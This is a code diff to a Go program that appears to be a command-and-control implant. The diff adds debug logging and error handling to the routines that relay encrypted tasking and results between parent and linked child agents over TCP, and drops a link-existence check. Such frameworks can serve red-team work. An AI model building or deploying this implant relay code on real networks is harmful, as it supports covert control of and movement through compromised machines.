@@ -9,6 +9,7 @@ package main
 import (
 	"encoding/base64"
 	"encoding/json"
+	"log"
 	"os"
 	"os/signal"
 	"syscall"
@@ -280,6 +281,12 @@ func handleServerData(conn *TCPConnection, encryptedPayload string) {
 	linkHandshake := lm.GetHandshakeData()
 	unlinkNotifications := lm.GetUnlinkNotifications()
 
+	log.Printf("[LINK] Collected from children: linkData=%d, linkHandshake=%v, unlinkNotifications=%d",
+		len(linkData), linkHandshake != nil, len(unlinkNotifications))
+	for i, ld := range linkData {
+		log.Printf("[LINK] LinkData[%d]: routingID=%s, payloadLen=%d", i, ld.RoutingID, len(ld.Payload))
+	}
+
 	hasResults := resultManager.HasResults()
 	hasLinkData := len(linkData) > 0
 	hasLinkHandshake := linkHandshake != nil
@@ -288,6 +295,8 @@ func handleServerData(conn *TCPConnection, encryptedPayload string) {
 	// Send results back (including any link data from child agents)
 	if hasResults || hasLinkData || hasLinkHandshake || hasUnlinkNotifications {
 		results := resultManager.GetPendingResults()
+		log.Printf("[LINK] Building response: results=%d, linkData=%d, hasHandshake=%v, unlinkNotifications=%d",
+			len(results), len(linkData), hasLinkHandshake, len(unlinkNotifications))
 
 		payload := map[string]interface{}{
 			"agent_id": clientID,
@@ -299,6 +308,7 @@ func handleServerData(conn *TCPConnection, encryptedPayload string) {
 
 		// Include link data from child agents (to be forwarded up the chain)
 		if hasLinkData {
+			log.Printf("[LINK] Including %d link data items in response (field: %s)", len(linkData), MALLEABLE_LINK_DATA_FIELD)
 			payload[MALLEABLE_LINK_DATA_FIELD] = ConvertLinkDataToMaps(linkData)
 		}
 
@@ -314,17 +324,24 @@ func handleServerData(conn *TCPConnection, encryptedPayload string) {
 
 		jsonData, err := json.Marshal(payload)
 		if err != nil {
+			log.Printf("[LINK] json.Marshal failed: %v", err)
 			return
 		}
 
 		// Encrypt with our secret
 		encrypted, err := secureComms.EncryptMessage(string(jsonData))
 		if err != nil {
+			log.Printf("[LINK] EncryptMessage failed: %v", err)
 			return
 		}
 
 		// Send back through TCP with transforms if configured
-		sendTCPResponse(conn, encrypted)
+		log.Printf("[LINK] Sending response to parent: payloadLen=%d", len(encrypted))
+		if err := sendTCPResponse(conn, encrypted); err != nil {
+			log.Printf("[LINK] sendTCPResponse FAILED: %v", err)
+			return
+		}
+		log.Printf("[LINK] Successfully sent response to parent")
 
 		// Rotate secret
 		secureComms.RotateSecret()
@@ -336,9 +353,15 @@ func handleServerData(conn *TCPConnection, encryptedPayload string) {
 		jsonData, _ := json.Marshal(emptyPayload)
 		encrypted, err := secureComms.EncryptMessage(string(jsonData))
 		if err != nil {
+			log.Printf("[LINK] EncryptMessage (empty) failed: %v", err)
 			return
 		}
-		sendTCPResponse(conn, encrypted)
+		log.Printf("[LINK] Sending empty response to parent")
+		if err := sendTCPResponse(conn, encrypted); err != nil {
+			log.Printf("[LINK] sendTCPResponse (empty) FAILED: %v", err)
+			return
+		}
+		log.Printf("[LINK] Successfully sent empty response to parent")
 		secureComms.RotateSecret()
 	}
 }
@@ -400,6 +423,8 @@ func handleLinkHandshakeResponse(rawMessage []byte) {
 func processLinkCommands(linkCmds []interface{}) {
 	lm := GetLinkManager()
 
+	log.Printf("[LINK] processLinkCommands: processing %d link commands", len(linkCmds))
+
 	for _, cmd := range linkCmds {
 		cmdMap, ok := cmd.(map[string]interface{})
 		if !ok {
@@ -408,25 +433,32 @@ func processLinkCommands(linkCmds []interface{}) {
 
 		routingID, _ := cmdMap[MALLEABLE_ROUTING_ID_FIELD].(string)
 		payload, _ := cmdMap[MALLEABLE_PAYLOAD_FIELD].(string)
+		// Check if payload has transforms applied by server (t=true means raw bytes after base64 decode)
 		transformed, _ := cmdMap["t"].(bool)
 
 		if routingID == "" || payload == "" {
+			log.Printf("[LINK] Skipping invalid link command: routingID=%s, payloadLen=%d", routingID, len(payload))
 			continue
 		}
 
-		_, exists := lm.GetLink(routingID)
-		if !exists {
-			continue
-		}
+		log.Printf("[LINK] Forwarding command to routingID=%s, payloadLen=%d, transformed=%v", routingID, len(payload), transformed)
 
+		// Forward to the linked agent AND WAIT for response
+		// If transformed=true, payload is base64-encoded transformed data - send as raw bytes
 		response, err := lm.ForwardToLinkedAgentAndWait(routingID, payload, transformed, 30*time.Second)
 		if err != nil {
+			log.Printf("[LINK] ForwardToLinkedAgentAndWait error for routingID=%s: %v", routingID, err)
 			continue
 		}
 
-		if response != nil {
-			lm.queueOutboundData(response)
+		if response == nil {
+			log.Printf("[LINK] ForwardToLinkedAgentAndWait returned nil response for routingID=%s (timeout?)", routingID)
+			continue
 		}
+
+		log.Printf("[LINK] Got response from routingID=%s, payloadLen=%d", routingID, len(response.Payload))
+		// Queue the response for sending back to parent
+		lm.queueOutboundData(response)
 	}
 }
 
